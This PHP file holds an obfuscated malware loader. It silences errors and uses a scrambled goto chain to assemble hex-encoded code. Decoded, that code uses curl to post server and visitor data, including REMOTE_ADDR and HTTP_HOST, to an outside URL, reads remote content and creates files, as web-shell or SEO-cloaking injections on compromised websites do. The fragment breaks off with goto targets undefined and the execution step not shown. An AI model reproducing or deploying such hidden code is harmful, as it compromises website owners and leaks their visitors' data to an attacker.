<?php
error_reporting(0);
$lrhyz=''; goto _695B10290A198;
_695B10290A265: $lrhyz.="\x61\x6c\x73\x65\x3b\x0d\x0a\x20\x20\x20\x20\x7d"; goto _695B10290A266;
_695B10290A2F4: $lrhyz.="\x5f\x73\x65\x74\x6f\x70\x74\x28\x24\x63\x68\x2c"; goto _695B10290A2F5;
_695B10290A2FF: $lrhyz.="\x54\x46\x49\x45\x4c\x44\x53\x2c\x20\x68\x74\x74"; goto _695B10290A300;
_695B10290A25C: $lrhyz.="\x65\x72\x20\x21\x3d\x20\x27\x27\x20\x26\x26\x20"; goto _695B10290A25D;
_695B10290A201: $lrhyz.="\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x72\x65"; goto _695B10290A202;
_695B10290A253: $lrhyz.="\x24\x74\x68\x69\x73\x2d\x3e\x73\x65\x72\x76\x65"; goto _695B10290A254;
_695B10290A26E: $lrhyz.="\x68\x70\x27\x29\x29\x20\x21\x3d\x3d\x20\x66\x61"; goto _695B10290A26F;
_695B10290A395: $lrhyz.="\x28\x24\x69\x73\x63\x29\x20\x7b\x0d\x0a\x20\x20"; goto _695B10290A396;
_695B10290A307: $lrhyz.="\x72\x6e\x6f\x28\x24\x63\x68\x29\x3b\x0d\x0a\x20"; goto _695B10290A308;
_695B10290A299: $lrhyz.="\x69\x66\x20\x28\x28\x24\x70\x6f\x73\x20\x3d\x20"; goto _695B10290A29A;
_695B10290A341: $lrhyz.="\x3d\x20\x40\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f"; goto _695B10290A342;
_695B10290A388: $lrhyz.="\x0d\x0a\x69\x66\x20\x28\x21\x24\x69\x73\x63\x20"; goto _695B10290A389;
_695B10290A2B6: $lrhyz.="\x20\x20\x20\x20\x24\x75\x72\x6c\x20\x3d\x20\x73"; goto _695B10290A2B7;
_695B10290A21F: $lrhyz.="\x45\x4d\x4f\x54\x45\x5f\x41\x44\x44\x52\x27\x29"; goto _695B10290A220;
_695B10290A1ED: $lrhyz.="\x53\x54\x27\x29\x20\x3f\x3a\x20\x24\x74\x68\x69"; goto _695B10290A1EE;
_695B10290A2E5: $lrhyz.="\x20\x43\x55\x52\x4c\x4f\x50\x54\x5f\x52\x45\x54"; goto _695B10290A2E6;
_695B10290A273: $lrhyz.="\x73\x2d\x3e\x73\x65\x72\x76\x65\x72\x28\x27\x53"; goto _695B10290A274;
_695B10290A355: $lrhyz.="\x20\x20\x20\x69\x66\x20\x28\x73\x74\x72\x70\x6f"; goto _695B10290A356;
_695B10290A282: $lrhyz.="\x69\x66\x20\x28\x62\x61\x73\x65\x6e\x61\x6d\x65"; goto _695B10290A283;
_695B10290A34A: $lrhyz.="\x20\x66\x69\x6c\x65\x20\x63\x72\x65\x61\x74\x65"; goto _695B10290A34B;
_695B10290A2CF: $lrhyz.="\x2c\x20\x27\x2f\x27\x29\x29\x3b\x0d\x0a\x20\x20"; goto _695B10290A2D0;
_695B10290A327: $lrhyz.="\x72\x69\x2c\x20\x2d\x31\x30\x29\x20\x3d\x3d\x20"; goto _695B10290A328;
_695B10290A344: $lrhyz.="\x28\x73\x74\x72\x70\x6f\x73\x28\x73\x74\x72\x74"; goto _695B10290A345;
